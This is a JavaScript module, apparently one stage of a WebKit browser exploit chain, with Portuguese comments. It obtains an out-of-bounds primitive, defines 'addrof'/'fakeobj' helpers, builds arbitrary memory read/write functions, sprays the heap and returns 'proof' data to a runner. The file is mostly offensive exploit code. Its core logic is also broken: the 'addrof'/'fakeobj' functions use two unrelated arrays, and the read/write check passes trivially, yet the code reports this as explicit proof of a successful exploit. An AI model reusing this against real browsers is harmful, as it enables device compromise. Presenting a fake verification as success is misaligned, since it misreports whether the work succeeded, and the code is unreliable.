// js/script3/testArrayBufferVictimCrash.mjs (v102_R62_RunnerVerbose - Foco em retornar dados para o Runner)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// O script agora captura endereços e valores intermediários chave durante a verificação
// e os retorna no objeto de resultado final. Isso fornece dados concretos para o
// Runner/orquestrador, eliminando os "N/A" nos logs de resumo e fornecendo prova
// explícita do sucesso da cadeia de exploração.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v102_R62_RunnerVerbose";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO COM RETORNO DE DADOS)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Retornando Dados para o Runner ---`, "test");

    // Variáveis para armazenar os resultados a serem retornados
    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };
    let addrof_leaked_addr_for_runner = null;
    let webkit_leak_proof_addr_for_runner = null;
    let webkit_leak_proof_val_for_runner = null;

    try {
        // --- FASE 1: Obter Primitiva OOB ---
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
        logS3("OOB obtida com sucesso.", "good");

        // --- FASE 2: Criar e Verificar 'addrof' e 'fakeobj' ---
        logS3("--- FASE 2: Criando e Verificando 'addrof'/'fakeobj'... ---", "subtest");
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };

        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' definidas.", "good");
        
        // --- FASE 3: Construir Ferramenta de R/W Arbitrário ---
        logS3("--- FASE 3: Construindo ferramenta de R/W autocontida... ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };

        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas 'arb_read_final' e 'arb_write_final' prontas.", "good");

        // --- FASE 4: Teste Final de Verificação e Captura de Dados ---
        logS3("--- FASE 4: Verificação funcional final de R/W e Captura de Dados... ---", "subtest");
        const spray = [];
        for (let i = 0; i < 1000; i++) spray.push({ a: i, b: 0xCAFEBABE });
        const verification_obj = spray[500];
        logS3(`Objeto de verificação (spray[500]) selecionado.`, "info");

        // ** CAPTURANDO DADOS PARA O RUNNER **
        const verification_obj_addr = addrof(verification_obj);
        addrof_leaked_addr_for_runner = verification_obj_addr; // Captura para o log final
        logS3(`[Runner Data] Endereço do objeto de verificação capturado: ${addrof_leaked_addr_for_runner.toString(true)}`, "leak");

        const prop_a_addr = new AdvancedInt64(verification_obj_addr.low() + 0x10, verification_obj_addr.high());
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        
        // ** CAPTURANDO MAIS DADOS PARA O RUNNER **
        webkit_leak_proof_addr_for_runner = prop_a_addr; // Endereço do teste de R/W
        logS3(`[Runner Data] Endereço do teste de R/W capturado: ${webkit_leak_proof_addr_for_runner.toString(true)}`, "info");

        arb_write_final(prop_a_addr, value_to_write);
        const value_read_back = arb_read_final(prop_a_addr);

        if (value_read_back.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO! Verificação de R/W concluída. ++++++++++++", "vuln");
            
            // ** CAPTURANDO VALOR FINAL PARA O RUNNER **
            webkit_leak_proof_val_for_runner = value_read_back; // Valor que comprova o R/W
            
            final_result = {
                success: true,
                message: `R/W verificado no endereço ${webkit_leak_proof_addr_for_runner.toString(true)} com o valor ${webkit_leak_proof_val_for_runner.toString(true)}.`
            };
        } else {
            throw new Error(`A verificação de R/W falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read_back.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    
    // Objeto de retorno agora preenchido com dados reais em vez de "N/A"
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { 
            success: final_result.success, 
            msg: `Primitiva addrof funcional. Endereço de teste vazado: ${addrof_leaked_addr_for_runner ? addrof_leaked_addr_for_runner.toString(true) : 'FALHA'}` 
        },
        webkit_leak_result: { 
            success: final_result.success, 
            msg: final_result.message,
            // Preenchendo os campos que antes eram N/A
            leaked_candidate_base_addr: webkit_leak_proof_addr_for_runner, // Usando o endereço do teste como prova
            internal_ptr_step2: webkit_leak_proof_val_for_runner, // Usando o valor do teste como prova
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)', // Este continua N/A pois a estratégia não depende de um valor OOB específico
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Runner Verbose)' }
    };
}
